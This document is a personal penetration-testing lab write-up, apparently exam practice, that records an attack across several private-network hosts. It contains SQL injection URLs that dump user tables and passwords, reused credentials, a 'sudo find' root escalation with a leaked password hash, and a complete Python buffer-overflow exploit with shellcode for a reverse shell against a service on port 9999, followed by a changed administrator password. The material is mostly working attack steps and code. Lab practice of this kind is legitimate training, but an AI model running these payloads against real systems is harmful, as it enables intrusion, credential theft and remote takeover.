# Practice Test Dry Run

Stack number: `5`
IP: `10.50.23.55`

## PublicFacingWebsite

NMAP:
```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-04-25 12:42 UTC
Nmap scan report for box1 (10.50.23.55)
Host is up (0.0022s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

http-enum:
```
Nmap scan report for box1 (10.50.23.55)
Host is up (0.0013s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```

In /scripts:
```
development.py

#!/usr/bin/python3

import os

system_user=user2
user_password=EaglesIsARE78

##Developer note

#script will eventually take above system user credentials and run automated services
```

SSH as user2:
```
$ cat /etc/passwd
root
user2

$ ip nei
10.10.28.30 dev ens3 lladdr fa:16:3e:ae:36:6a REACHABLE

$ cat /etc/hosts
192.168.28.181 WebApp
```

## 192.168.28.181

NMAP (pivot through box1):
```
Nmap scan report for 192.168.28.181
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Website Inject:
```
http://192.168.28.181/pick.php?product=7%20union%20select%20table_schema,column_name,table_name%20from%20information_schema.columns%20#
```

Table:
```
siteusers.users
$user_id
$name
$username
```

Inject:
```
http://192.168.28.181/pick.php?product=7%20union%20select%20user_id,name,username%20from%20siteusers.users%20#
```

Results:
```
1 	Aaron 	$Aaron
2 	user2 	$user2
3 	user3 	$user3
4 	Lroth 	$Lee_Roth
1 	ncnffjbeqlCn$$jbeq 	       $Aaron
2 	RntyrfVfNER78 	           $user2 (EaglesIsARE78)
3 	Obo4GURRnccyrf 	           $user3 (Bob4THEEapples)
4 	anotherpassword4THEages    $Lroth
```

Ping From box1:
```
64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=1.59 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=1.25 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.477 ms
```

## 192.168.28.172 (RoundSensor)

NMAP:
```
Nmap scan report for 192.168.28.172
Host is up (0.00092s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
7008/tcp open  afs3-update
```

SSH:
```
Aaron:apasswordyPa$$word

$ ip nei
192.168.28.190 dev ens3 lladdr fa:16:3e:0a:a5:3b REACHABLE

(ALL) NOPASSWD: /usr/bin/find
```

Root it:
```
sudo find . -exec /bin/bash \; -quit

root:$6$WvO4dfiP$Qas0mC5CFUXJNFSm3eQqIQNLeKvPKYSzj4cZ7fmCLjTantMkRaZ4tlkgVvWg/FQxepAV3re35ScpOFf.BusLv1:19471:0:99999:7:::
```

In /root:
```
root@RoundSensor:/root# cat ab.sh
#!/bin/bash
nc -z localhost 7008
if [ $? = 0 ]
then
continue
else
nc -k -l 7008 &
fi
```

```
#!/bin/bash > /root/run
read -r -n 2 count < num
if [ \$count -ge 30 ]
then
  echo '0' > num
  count=0
fi

countycount=\$(( \$count + 1 ))
echo \$countycount > num
export \$countycount
. /lib/libhandle.10
. /lib/libhandle.11
. /lib/libhandle.12
```

Ping Sweep:
```
192.168.28.179
```

## Windows Box (192.168.28.179)

NMAP:
```
Nmap scan report for 192.168.28.179
Host is up (0.0013s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
9999/tcp open  abyss        (SECURE SERVER)
```

Creds:
```
Lroth:anotherpassword4THEages
```

RDP:
```
xfreerdp /v:localhost:21202 /u:Lroth /p:anotherpassword4THEages /size:1900x1000 +clipboard
```

Run Reg:
```
"C:\Users\lroth.INTERNAL-WINDOW\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
```

Reverse Shell:
```
#!/usr/bin/python

import socket

host = "192.168.28.179"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

print s.recv(1024)

head = "TRUN /.:/ "
pad = "A"*2002
eip = "\xa0\x12\x50\x62"
nop_sled = '\x90'*16

buf =  b""
buf += b"\xdb\xde\xb8\xc3\xd2\x34\xef\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x53\x83\xc6\x04\x31\x46\x13\x03\x85"
buf += b"\xc1\xd6\x1a\xf5\x0e\x94\xe5\x05\xcf\xf9\x6c\xe0"
buf += b"\xfe\x39\x0a\x61\x50\x8a\x58\x27\x5d\x61\x0c\xd3"
buf += b"\xd6\x07\x99\xd4\x5f\xad\xff\xdb\x60\x9e\x3c\x7a"
buf += b"\xe3\xdd\x10\x5c\xda\x2d\x65\x9d\x1b\x53\x84\xcf"
buf += b"\xf4\x1f\x3b\xff\x71\x55\x80\x74\xc9\x7b\x80\x69"
buf += b"\x9a\x7a\xa1\x3c\x90\x24\x61\xbf\x75\x5d\x28\xa7"
buf += b"\x9a\x58\xe2\x5c\x68\x16\xf5\xb4\xa0\xd7\x5a\xf9"
buf += b"\x0c\x2a\xa2\x3e\xaa\xd5\xd1\x36\xc8\x68\xe2\x8d"
buf += b"\xb2\xb6\x67\x15\x14\x3c\xdf\xf1\xa4\x91\x86\x72"
buf += b"\xaa\x5e\xcc\xdc\xaf\x61\x01\x57\xcb\xea\xa4\xb7"
buf += b"\x5d\xa8\x82\x13\x05\x6a\xaa\x02\xe3\xdd\xd3\x54"
buf += b"\x4c\x81\x71\x1f\x61\xd6\x0b\x42\xee\x1b\x26\x7c"
buf += b"\xee\x33\x31\x0f\xdc\x9c\xe9\x87\x6c\x54\x34\x50"
buf += b"\x92\x4f\x80\xce\x6d\x70\xf1\xc7\xa9\x24\xa1\x7f"
buf += b"\x1b\x45\x2a\x7f\xa4\x90\xc7\x77\x03\x4b\xfa\x7a"
buf += b"\xf3\x3b\xba\xd4\x9c\x51\x35\x0b\xbc\x59\x9f\x24"
buf += b"\x55\xa4\x20\x5b\xfa\x21\xc6\x31\x12\x64\x50\xad"
buf += b"\xd0\x53\x69\x4a\x2a\xb6\xc1\xfc\x63\xd0\xd6\x03"
buf += b"\x74\xf6\x70\x93\xff\x15\x45\x82\xff\x33\xed\xd3"
buf += b"\x68\xc9\x7c\x96\x09\xce\x54\x40\xa9\x5d\x33\x90"
buf += b"\xa4\x7d\xec\xc7\xe1\xb0\xe5\x8d\x1f\xea\x5f\xb3"
buf += b"\xdd\x6a\xa7\x77\x3a\x4f\x26\x76\xcf\xeb\x0c\x68"
buf += b"\x09\xf3\x08\xdc\xc5\xa2\xc6\x8a\xa3\x1c\xa9\x64"
buf += b"\x7a\xf2\x63\xe0\xfb\x38\xb4\x76\x04\x15\x42\x96"
buf += b"\xb5\xc0\x13\xa9\x7a\x85\x93\xd2\x66\x35\x5b\x09"
buf += b"\x23\x55\xbe\x9b\x5e\xfe\x67\x4e\xe3\x63\x98\xa5"
buf += b"\x20\x9a\x1b\x4f\xd9\x59\x03\x3a\xdc\x26\x83\xd7"
buf += b"\xac\x37\x66\xd7\x03\x37\xa3"

s.send(head + pad + eip + nop_sled + buf)

print s.recv(1024)

s.close()
```

Changed 'Admin' user password to 'toor'
